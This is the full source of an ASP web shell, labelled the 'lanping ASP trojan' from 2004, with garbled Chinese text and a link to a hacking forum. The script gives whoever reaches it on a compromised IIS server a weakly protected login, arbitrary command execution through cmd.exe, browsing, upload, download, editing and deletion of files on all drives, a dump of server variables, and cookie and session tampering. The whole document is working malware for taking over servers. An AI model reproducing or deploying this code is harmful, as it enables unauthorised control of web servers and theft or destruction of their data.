<%@codepage=936%><%Response.Expires=0
on error resume next
Co=Request.ServerVariables("URL")
zc="<b>&#34013&#23631ASP&#26408&#39532&copy2004"
	session(zc)=5 '<=���ӵ�½����;ɾ����ע�͵��˾�%><style>body{font-size:9pt;color:blue}table{font-family:����;font-size:9pt}a{font-family:����;font-size:9pt;color:blue;text-decoration:none}a:hover{font-family:����;color:red}input{BORDER-RIGHT:blue 1px solid;BORDER-TOP:blue 1px solid;BACKGROUND:white;BORDER-LEFT:blue 1px solid;BORDER-BOTTOM:blue 1px solid;FONT-FAMILY:Verdana,Arial FONT-COLOR:blue;FONT-SIZE:9pt;}</style><%if session(zc)=5 then
Session.TimeOut=50
Server.ScriptTimeout=3000
if request("p")=8 then%><SCRIPT RUNAT=SERVER LANGUAGE=VBS>
dim zh
CLASS ZB
dim isForm,isFile
Public function Form(sg)
Form=isForm(lcase(sg))
if not isForm.exists(sg)then Form=""
end function
Public function File(sj)
File=isFile(lcase(sj))
if not isFile.exists(sj)then File=new ZI
end function
Private Sub CLASS_Initialize
dim Rq,sSt,vbCrlf,sx,oE,itt,FE,sFV,sFe,fj,iFE,iFS,iFd,sFN
set isForm=CreateObject("Scripting.Dictionary")
set isFile=CreateObject("Scripting.Dictionary")
set tZ=CreateObject("Adodb.Stream")
set zh=CreateObject("Adodb.Stream")
zh.Type=1
zh.Mode=3
zh.Open
zh.Write Request.BinaryRead(Request.TotalBytes)
zh.Position=0
Rq=zh.Read
iFS=1
iFd=LenB(Rq)
vbCrlf=chrB(13)&chrB(10)
sSt=MidB(Rq,1,InStrB(iFS,Rq,vbCrlf)-1)
itt=LenB(sSt)
iFS=iFS+itt+1
while (iFS+10)<iFd
oE=InStrB(iFS,Rq,vbCrlf&vbCrlf)+3
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=iFS
zh.CopyTo tZ,oE-iFS
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sx=tZ.ReadText
tZ.Close
iFS=InStrB(oE,Rq,sSt)
fj=InStr(22,sx,"name=""",1)+6
iFE=InStr(fj,sx,"""",1)
sFN=lcase(Mid(sx,fj,iFE-fj))
if InStr(45,sx,"filename=""",1)>0 then
set FE=new ZI
fj=InStr(iFE,sx,"filename=""",1)+10
iFE=InStr(fj,sx,"""",1)
sFe=Mid(sx,fj,iFE-fj)
FE.filename=GA(sFe)
FE.fh=GP(sFe)
fj=InStr(iFE,sx,"Content-Type:",1)+14
iFE=InStr(fj,sx,vbCr)
FE.Fz=Mid(sx,fj,iFE-fj)
FE.FSt=oE
FE.fy=iFS-oE-3
FE.fme=sFN
if not isFile.Exists(sFN)then isFile.add sFN,FE
else
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=oE
zh.CopyTo tZ,iFS-oE-3
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sFV=tZ.ReadText
tZ.Close
if not isForm.Exists(sFN)then isForm.Add sFN,sFV
end if
iFS=iFS+itt+1
wend
Rq=""
set tZ=nothing
End Sub
Private function GP(Ph)
GP=left(Ph,InStrRev(Ph,"\"))
End function
Private function GA(Ph)
GA=mid(Ph,InStrRev(Ph,"\")+1)
End function End CLASS
CLASS ZI
dim FSt,fy,filename,fh,Fz,fme
Public sub SD(Ph)
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FSt
zh.copyto dr,fy
dr.SaveToFile Ph,2
dr.Close
set dr=nothing
end sub End CLASS</SCRIPT><%set ud=new ZB
fP=ud.isform("fh")
if right(fP,1)<>"\"then fP=fP&"\"
for each fme in ud.isFile
set file=ud.isFile(fme)
if file.filename=""or file.fy<0 then
Response.Write"�ļ�? "
exit for
end if
file.SD fP&file.filename
Response.write"�ϴ��� "&fP&file.filename&"</br>"
set file=nothing
next
set ud=nothing
response.write"<a href=# onclick=history.back()>[����]</a>"
response.end
end if%><object runat=server id=lP scope=page classid="clsid:00000566-0000-0010-8000-00AA006D2EA4"></object><object runat=server id=fB scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object><object runat=server id=tN scope=page classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object><object runat=server id=sa scope=page classid="clsid:13709620-C279-11CE-A49E-444553540000"></object><object runat=server id=TV scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object><%dN="\\"&tN.ComputerName&"\"&tN.UserName
Rx=Request("pw")
If Err then
call MN()
else
Rp=Co&"?pw="&Server.URlEncode(Request("jl"))&"&ib="&Request("ib")
select case request("id")
case"edit"call edit(0)
case"dir"call dir()
case"dc"call ZD()
case"pan"call pan()
case"FS"call MN()
case"out"call out()
case else call mz()
end select
end if
sub MN()
on error resume next%><p align=center><table border=1 width=580 cellspacing=0 cellpadding=0 bgcolor=#61bbd6><tr><td>��������</td><td width=338><a href=http://<%=Request.ServerVariables("SERVER_NAME")%> target=_blank><%=Request.ServerVariables("SERVER_NAME")%></a></td></tr><tr><td>IP:�˿� ʱ��</td><td><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%>��<%=now%></td></tr><tr><td>CPU���� OS</td><td><%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> �� {<%=Request.ServerVariables("OS")%>}</td></tr><tr><td>������ַ:</td><td><%=dN%></td></tr><tr><%t1=timer
for i=1 to 500000
ys=1+1
next
t2=timer
T3=cstr(int(((t2-t1)*10000)+0.5)/10)%><td>�����ٶ�</td><td><%=T3%> ����(256M 2.4GΪ156.3����)</td></tr><tr><td><font color=red>�ͻ���IP���˿� [�޴���]</td><td><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>��<%=Request.ServerVariables("REMOTE_PORT")%>
[<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td></tr><tr><td>���ļ�</td><td><a href=?pw=<%=server.urlencode(left(Co,InStrRev(Co,"/")))%>><%=server.mappath(Co)%></a></td></tr><TR><TD colspan=2><form method=post name=fm enctype="multipart/form-data" action="?p=8">����·��:<input name=fh value="<%=Server.MapPath(".")%>"size=84><BR></TD></tr><tr><td id=uz width=242>�ļ�1<input type=file name=file></td><td valign=top align=center>��=><%=chr(127)%><=�� &nbsp;<SCRIPT language=javascript>function sm(){fl=document.fm;str='';if(!fl.ut.value)fl.ut.value=1;for(i=1;i<=fl.ut.value;i++)str+='�ļ�'+i+'<input type=file name=file'+i+'><br>';window.uz.innerHTML=str+'';}</SCRIPT><INPUT type=button onclick=sm() value=�趨> �ϴ� <INPUT value=1 name=ut size=2 maxlength=2> �ļ� <input type=submit value=�ϴ�> <INPUT type=reset value=����></td></TR></form></table><form method=post action="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Co%>"><input type=hidden name=id value=FS><input type=hidden name=nz value=0>
<input type=submit value=ִ��> <input type=submit name=ZP value=�Ự> <input type=submit name=ZG value=����������> <input type=submit name=ih value=�˳�> <INPUT type=reset value=����><%=timer%><a href=?><%=zc%></a><BR>����:<input name=zk> Ŀ��·��:<input name=zl><br>�ƶ�:<input name=zm> Ŀ��·��:<input name=zn><br>����:<input name=zo> ��Ӳ���:<input name=zq><br>���:<input name=ZJ> DOS ����:<input name=ok value="%COMSPEC% /c "><br>����:<input name=pw> ��̳��½ <input value="  ���㼫��&���󶥶�"onclick=window.open('http://www.icehack.com')></form><hr><%if Request("ih")<>""then call out()
if Request("cy")=2 or request("zt")<>""then
call edit(3)
response.end
end if
if Rx<>""and Request("nz")=0 then
call ZD()
response.end
end if
if Request("ZP")<>""then
call cs()
response.end
end if
if Request("ZG")<>""then
response.write"���������б���</p>"
for each Y in request.servervariables
response.write Y&"<br>"&request.servervariables(Y)&"<HR>"
next
end if
hz=Request("ok")
if hz<>""and hz<>"%COMSPEC% /c "then
on error resume next
response.write"ִ��:"&hz&"<br><xmp>"&TV.exec(hz).stdout.readall&"</xmp>"
if Err then
response.write Err.Description
T=server.mappath("lp"&year(date)&Session.SessionID&".asp")
TV.run "%COMSPEC% /c echo ^<xmp^>>"&T,1,True
TV.run hz&">>"&T,1,True
response.write"<br>ִ����"&hz&"&nbsp{��ʱ�ļ�}:"&T&"<br><Iframe src='lp"&year(date)&Session.SessionID&".asp' width=99% height=99% frameborder=0></iframe>"
response.flush
'for i=1 to 1800000
'ys=9+9
'next
'TV.run "%COMSPEC% /c echo Y|del "&T,1,True
set TV=Nothing
end if
end if
sz=Request("ZJ")
if sz<>""then
if right(sz,1)<>"\"then sz=sz&"\"
if len(sz)>3 then
sz=left(sz,InStrRev(sz,"\")-1)
pw=left(sz,InStrRev(sz,"\"))
else
sz=left(sz,1)&":\"
pw=sz
end if
response.write "<table border=1 width=99% cellspacing=0 cellpadding=0 bgcolor=white><tr><TD width='60%'><a href=/"&Server.URlEncode(Co)&"?id=FS&zj="&pw&"><b> (�ϼ�: "&pw&")</a> Ŀ ¼</td><td><b>��С</td><td width='20%'><b>����</td></tr>"
for each Z in sa.namespace(sz).items
if Z.size=0 then
response.write "<tr><TD width='60%'><a href=/"&Server.URlEncode(Co)&"?id=FS&zj="&Server.URlEncode(Z.path)&">"&Z.path&"</a></td><td></td><td width='20%'><a href=/"&Server.URlEncode(Co)&"?id=FS&zj="&Server.URlEncode(z.path)&">"&Z.Type&"</a></td></tr>"
else
response.write "<tr><TD><a href=/"&Server.URlEncode(Co)&"?id=FS&pw="&Server.URlEncode(Z.path)&"&nz=0>"&Z.path&"</a></td><td>"&Z.size&"</td><td><a href=/"&Server.URlEncode(Co)&"?id=FS&pw="&Server.URlEncode(Z.path)&"&ib=true&cy=2 target=_blank>�༭</a></td></tr>"
end if
next
response.write "</table>"
response.end
end if
z1=Request("zk")
z2=Request("zl")
if z1<>""and z2<>""then
if right(z2,1)<>"\"then z2=z2&"\"
for i=len(z1) to 1 step -1
if mid(z1,i,1)="\"then
pw=left(z1,i-1)
exit for
end if
next
if len(pw)<3 then pw=pw&"\"
pz=right(z1,len(z1)-i)
sa.namespace(z2).copyhere sa.namespace(pw).parsename(pz)
response.write"ok!"
end if
z3=Request("zm")
z4=Request("zn")
if z3<>""and z4<>""then
if right(z4,1)<>"\"then z4=z4&"\"
for i=len(z3) to 1 step -1
if mid(z3,i,1)="\"then
pw=left(z3,i-1)
exit for
end if
next
if len(pw)<3 then pw=pw&"\"
pv=right(z3,len(z3)-i)
sa.namespace(z4).movehere sa.namespace(pw).parsename(pv)
response.write"ok!"
end if
z5=Request("zo")
z6=Request("zq")
if z5<>""and z6<>""then
if right(z5,1)<>"\"then z5=z5&"\"
sa.namespace(z5).items.item(z6).invokeverb
response.write"ok!"
end if
If Request.ServerVariables("Content_Length")=0 Then response.write"<Iframe src='http://"&Request.ServerVariables("SERVER_NAME")&"' width=99% height=99% frameborder=0></iframe>"
end sub
sub mz()
zw=Rx
if right(zw,1)<>"/" then zw=Rx&"/"
if Request("ib")="true"then
zv=zw
ib="true"
else
zv=Server.MapPath(zw)
ib=""
end if%><script language=JavaScript>function crfile(ls){if(ls==""){alert("�ļ���?");}else{window.open("/<%=Server.URlEncode(Co)%>?id=edit&ib=<%=request("ib")%>&cy=1&pw=<%=Server.URlEncode(zw)%>"+ls)}}function crdir(ls){if (ls==""){alert("Ŀ¼��?");}else{window.open("/<%=Server.URlEncode(Co)%>?id=dir&ib=<%=request("ib")%>&op=cz&pw=<%=Server.URlEncode(zw)%>"+ls)}}</script><script LANGUAGE=VBS>ib="<%=request("ib")%>"
sub copyfile(zu)
dz=trim(InputBox(Chr(13)&Chr(10)&"Դ�ļ���"&zu&Chr(13)&Chr(10)&"Ŀ���ļ�:"&Chr(13)&Chr(10)&"���·�� ��c:/��c:\����"))
if dz=""then
alert"�ļ���?"
else
window.open"/<%=Server.URlEncode(Co)%>?id=edit&pw="+zu+"&op=copy&ib=true&dx="+dz
end If end sub</script><center><TABLE border=1 cellSpacing=1 cellPadding=3 width=768 bgColor=#dddddd><tr><td colspan=4><a href=?id=out title=�˳�>���ļ�: <%=server.mappath(Co)%></a></td></tr><TD colspan=4 bgcolor=white>�л��̷���<%
For Each thing in fB.Drives
Response.write"<a href=?pw="&thing.DriveLetter&":&ib=true>"&thing.DriveLetter&"��:</a> "
NEXT%>������ַ��<%=dN%></TD><tr><TD colspan=4><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>:<%=Request.ServerVariables("REMOTE_PORT")%> [<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font><a href=?id=pan target=_blank> ������Ϣ </a><%=now%><a href=<%=Co%>?id=FS> <%=zc%> </a>&nbsp;<%if Request("ib")=""then%><a href=?path=<%=zw%>&php=7> PHP ̽�� </a><%end if%><font color=red><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%></TD></tr><TD colspan=4 bgcolor=white><a href=?pw=<%if Request("ib")="true" then%><%=Server.URlEncode(Request("jl"))%> title=�������·��<%else%><%=Server.URlEncode(zv)%>&ib=true&jl=<%=Server.URlEncode(zw)%> title=��������·��<%end if%>><%if Request("ib")="true" then%>��<%else%>��<%end if%>��·�� <%=zv%></a> ��ǰĿ¼:<%=zw%></TD><TR><TD colspan=4><form>
���Ŀ¼: <input name=pw size=90 value=c:><input type=hidden name=ib value=true> <input type=submit value=���></TD></form></TR><TR bgColor=white><form><TD colspan=4>���������Ŀ¼���ļ� #��%23 %��%25 &��%26 +��%2B '��%27 <input name=fn size=44> <input type=button onclick=crfile(fn.value) value=���ļ�> <input type=button value=��Ŀ¼ onclick=crdir(fn.value)></TD></form></TR><TR><TD width=210 valign=top rowspan=2><%if fB.FolderExists(zv)then
Set Fc=fB.GetFolder(zv)
Set fg=Fc.SubFolders
fk=left(zw,Abs(len(zw)-(len(Fc.name)+1)))
Response.write"<a href=?pw="&Server.URlEncode(fk)&"&ib="&ib&"><b>�����ϼ�Ŀ¼</b></a><br>"
For Each z In fg
Response.write"<a href=?pw="&Server.URlEncode(zw&z.Name)&"&ib="&ib&">���� "&z.name&"</a> <a href=?id=dir&pw="&Server.URlEncode(zw&z.Name)&"&op=del&ib="&ib&"&jl="&Server.URlEncode(zw)&" onclick="&chr(34)&"return confirm('ɾ��"&Server.URlEncode(z.Name)&"?')"&chr(34)&">��ɾ��</a><br>"
Next%></TD><TD width=232>&nbsp;�ļ�</TD><TD align=right width=108>���� ��С���ֽڣ�</TD><TD align=center width=94>����</TD></TR><TR><TD colspan=3 valign=top bgColor=WHITE><table width=528 cellspacing=0 cellpadding=2><%Set FEs=Fc.Files
For Each x In FEs
if Request("ib")="true" then
shz="<a href=?id=dc&pw="&Server.URlEncode(zw&x.Name)&" title='"&"����"&x.type&chr(10)&"ʱ�䣺"&x.DateLastModified&"'><b>"&x.Name&"</b></a>"
else
shz="<a href=/"&Server.URlEncode(Right(zw,len(zw)-1)&x.name)&" title='"&"����"&x.type&chr(10)&"ʱ�䣺"&x.DateLastModified&"'target=_blank><b>"&x.Name&"</b></a>"
end if
Response.write"<tr><td width=356 style='border-bottom:1 solid blue'>"&shz&"</td><td width=80 style='border-bottom:1 solid blue'>"&x.Attributes&" "&x.size&"</td><td width=92 style='border-bottom:1 solid blue'><a href=/"&Server.URlEncode(Co)&"?id=edit&pw="&Server.URlEncode(zw&x.Name)&"&ib="&ib&" target=_blank>�༭ </a><a href=?id=edit&pw="&Server.URlEncode(zw&x.Name)&"&op=del&ib="&ib&"&jl="&Server.URlEncode(zw)&" onclick="&chr(34)&"return confirm('ɾ��"&Server.URlEncode(x.Name)&"?')"&chr(34)&">ɾ��</a>"
if Request("ib")="true"then Response.write"<a href=# onclick=copyfile('"&Server.URlEncode(zw&x.Name)&"')> ����</a>"
Response.write"</td></tr>"
Next
end if%></table></TD></TR></TABLE><%end sub
sub pan()
For Each pa in fB.Drives
On Error Resume Next
pa1=pa.AvailableSpace
if pa1/1024/1024<1024 then
pa1=round(pa1/1024/1024*100)/100&" MB"
else
pa1=round(pa1/1024/1024/1024*100)/100&" GB"
end if
pa2=round(pa.TotalSize/1024/1024/1024*100)/100
pa3=pa.DriveType
select case pa3
case 0 pa3="δ֪"
case 1 pa3="����"
case 2 pa3="Ӳ��"
case 3 pa3="����"
case 4 pa3="����"
case 5 pa3="RAM��"
end select
Response.write"<a href=?pw="&pa.DriveLetter&":&ib=true>"&pa3&" "&pa.DriveLetter&" &nbsp�ļ�ϵͳ:"&pa.FileSystem&" &nbsp&nbsp����&nbsp "&pa2&" GB &nbsp&nbsp���ÿռ�&nbsp"&pa1&" "&pa.IsReady&" "&pa.Path&" "&pa.RootFolder&" "&pa.SerialNumber&"</a><HR>"
next
end sub
sub edit(R)
pF=Rx
if Request("ib")<>"true"then pF=server.mappath(pF)
if request("op")="del"then
if lcase(fB.GetFile(pF))<>lcase(server.mappath(Co))then
fB.GetFile(pF).Delete True
end if
Response.redirect Rp
end if
if request("op")="copy"then
fB.GetFile(pF).copy Request("dx")
Response.write"<SCRIPT>alert('����"+pF+" ��"+REPLACE(dx,"\","/")+"');window.close()</SCRIPT>"
end if
if request("zt")=""then
if Request("cy")<>1 and Request("cy")<>2 then
Set ZF=fB.OpenTextFile(pF,1,False)
Za=Server.HTMLEncode(ZF.readall)
ZF.Close
elseif Request("cy")=2 then
lP.Open
lP.Type=2
lP.CharSet="gb2312"
lp.LoadFromFile(pF)
Za=Server.HTMLEncode(lp.ReadText)
lp.Close
end if%><SCRIPT language=JavaScript>var i=0;var ie=(document.all)?1:0;var ns=(document.layers)?1:0;function selectCode(){if(document.pad.zt.value.length>0){document.pad.zt.focus();document.pad.zt.select();}else alert('����?')}function preview(){if(document.pad.zt.value.length>0){pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");pr.document.write(document.pad.zt.value);}else alert('Ԥ������?')}function uncompile(){if(document.pad.zt.value.length>0){source=unescape(document.pad.zt.value);document.pad.zt.value=""+source+"";i++;alert("����"+i+"��!");}else alert('����?')}</SCRIPT><form method=post name=pad action="<%=Server.URlEncode(Co)%>?id=edit"><input type=hidden name=ib value="<%=Request("ib")%>"><CENTER><TD>�༭�ļ�����<input name=pw value="<%=Rx%>"></TD><BR><TD><textarea rows=30 cols=100% name=zt><%=Za%></textarea></TD><BR><TD><input type=submit value=�ύ accesskey=s> <INPUT onclick=selectCode() type=button value=ȫѡ>
<INPUT onclick=preview() type=button value=Ԥ��> <INPUT onclick=uncompile() type=button value=JAVA����> <INPUT type=reset value=����></TD></form>
<%elseif R=3 then
lP.Open
lP.Type=2
lP.CharSet="gb2312"
lP.writetext request("zt")
lP.SaveToFile pF,2
lP.Close
set lP=nothing
Response.write"<SCRIPT>alert('��ɣ�"+REPLACE(Rx,"\","/")+"');window.close()</SCRIPT>"
else
fB.CreateTextFile(pF).Write Request("zt")
Response.write"<SCRIPT>alert('��ɣ�"+REPLACE(Rx,"\","/")+"');window.close()</SCRIPT>"
end if end sub
sub dir()
if Request("ib")<>"true"then Rx=server.mappath(Rx)
if request("op")="del"then
fB.DeleteFolder Rx,True
Response.redirect Rp
end if
if request("op")="cz"then
set fjl=fB.CreateFolder(Rx)
CreateFolderDemo=fjl.Path
Response.write"<SCRIPT>alert('��Ŀ¼:"&REPLACE(Rx,"\","/")&"');window.close()</SCRIPT>"
end if end sub
SUB ZD()
zr=REPLACE(Trim(Rx),"/","\")
lP.Open
lP.Type=1
lP.LoadFromFile(zr)
for i=len(zr) to 1 step -1
if mid(zr,i,1)="\"then exit for
next
ny=right(zr,len(zr)-i)
Response.Clear
Response.AddHeader"Content-Disposition","attachment;filename="&ny
Response.CharSet="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite lP.Read
lP.Close
Set lP=nothing
End SUB
sub cs()%><center><table width=600 border=1 cellpadding=0 cellspacing=0><form name=fc method=post action="?id=FS&sc=6"><tr><td height=27><nobr>response.cookies(&quot;<input name=co1 value="<%=co1%>" size=15>&quot;)(&quot;<input name=co2 value="<%=co2%>" size=15>&quot;)=&quot;<input name=cov value="<%=cov%>" size=15>&quot;&nbsp;<input name=Submit type=submit  value="����COOKIES"></td></tr></form><tr><td height=27><%response.write"��ǰ�ڴ�վ������COOKIES���£�<br>"
For Each c in Request.Cookies
If Request.Cookies(c).HasKeys Then
For Each K in Request.Cookies(c)
Response.Write"<b>response.cookies('"&c&"')('"&K&"')</b>="&Request.Cookies(c)(K)&"<a href='?id=FS&sc=6&dk="&Server.URlEncode(c)&"'> ���</a><br>"
Next
Else
Response.Write"<b>response.cookies('"&c&"')</b>="&Request.Cookies(c)&"<a href='?id=FS&sc=6&dk="&Server.URlEncode(c)&"'> ���</a><br>"
End If
Next%></td></tr><form name=fs method=post action="?id=FS&sc=6"><tr><td height=27>&nbsp;session(&quot;<input name=s1 value="<%=s1%>" size=15>&quot;)=&quot;<input name=sv value="<%=sv%>" size=15>&quot;
<input name=Submit type=submit value="����SESSION">
<input name=cc type=submit value="�������SESSION"></td></tr></form><tr><td height=27><%Response.Write"��վ��SESSION����: "&Session.Contents.Count&" ID: "&Session.SessionID&"<br>"
For Each s in Session.Contents
If IsArray(Session(s))then
For iLoop=LBound(Session(s)) to UBound(Session(s))
Response.Write"session('"&Server.HTMLEncode(s)&")("&iLoop&")="&Session(s)(iLoop)&"<a href='?id=FS&sc=6&ds="&Server.URlEncode(s)&"'> ���</a><BR>"
Next
Else
Response.Write"session('"&Server.HTMLEncode(s)&"')="&Session.Contents(s)&"<a href='?id=FS&sc=6&ds="&Server.URlEncode(s)&"'> ���</a><BR>"
End If
next%></td></tr></table><%end sub
if request("sc")=6 then
co1=request("co1")
co2=request("co2")
cov=request("cov")
s1=request("s1")
sv=request("sv")
if co1<>""then
Response.Cookies(co1).Expires=Date+30
Response.Cookies(co1)(co2)=cov
call cs()
end if
if request("ds")<>""then
session.Contents.Remove(request("ds"))
response.redirect"?id=FS&ZP=6"
end if
if request("dk")<>""then
Response.Cookies(request("dk")).Expires=Date-1
response.redirect"?id=FS&ZP=6"
end if
if s1<>""then
session(s1)=sv
call cs()
end if
if request("cc")<>""then
'Session.Contents.RemoveAll	'���ֵ�ǰID
Session.Abandon
call cs()
end if
end if
sub out()
Session(zc)=0
response.redirect Co
End sub
if request("php")=7 then
TQ=server.mappath(FB.GetTempName()&".php")
fB.CreateTextFile(TQ).Write"<center>PHP̽��<input type=button value=�ر�(ALT+X) onClick='JavaScript:self.close()' accesskey=X><br><? phpinfo();//�ź�:�˷�������֧��PHP ?>"
Response.write"<script>window.open('"&fB.GetFileName(TQ)&"')</script>"
Response.Flush
for i=1 to 3800000
ys=9+9
next
FB.DeleteFile TQ,True
end if
else
randomize timer
rj=int(rnd*8999)+1000
function Ez(m)
tpa=StrReverse(left(m&"lanping2004",11))
tpn=len(m)
mpd=""
for l=1 to 11
mpd=mpd+chr(asc(mid(tpa,l,1))-tpn+int(l*1.1))
next
Ez=Server.URlEncode(mpd)
end function%><center><%=zc%><script language=javascript>function check(){var mj=document.adm;if(mj.az.value.length<=0){alert("���֣�");mj.az.focus();return false;}if(mj.aw.value.length<=0){alert("���룿");mj.aw.focus();return false;}if(mj.rz.value.length<=0){alert("��֤�룿");mj.rz.focus();return false;}var n2=mj.rz1.value;if(mj.rz.value!=n2){window.alert('��֤��: '+n2+'');mj.rz.focus();return false;}}</script><%if request("az")<>""and Ez(request("az"))<>"0fnjrqeqtiu"then response.write"����?" '<=�޸ĵ�½��1
if request("aw")<>""and Ez(request("aw"))<>"dlhpocokspx"then response.write"����?" '<=�޸ĵ�½����2
if Ez(request("az"))="0fnjrqeqtiu"and Ez(request("aw"))="dlhpocokspx"then '<=�޸ĵ�½��������3
session(zc)=5
response.redirect Co
else
Session(zc)=Session(zc)+1
if Session(zc)=4 then response.redirect"http://"&Request.ServerVariables("SERVER_NAME")
if Session(zc)>4 then response.write"<script>self.window()</script>"%><form name=adm onsubmit="return check()">����: <input type=password name=az><br>����: <input type=password name=aw><input type=hidden name=rz1 value=<%=rj%>><BR>��֤: <input type=password name=rz size=14> <%=rj%><br>�ỰID:<%=Session.SessionID%> <input type=submit value=��¼> <%=Session(zc)%> ��</form><FONT style='FONT-SIZE:48pt;FONT-FAMILY:Wingdings'>&lt;:8</FONT><%end if end if%>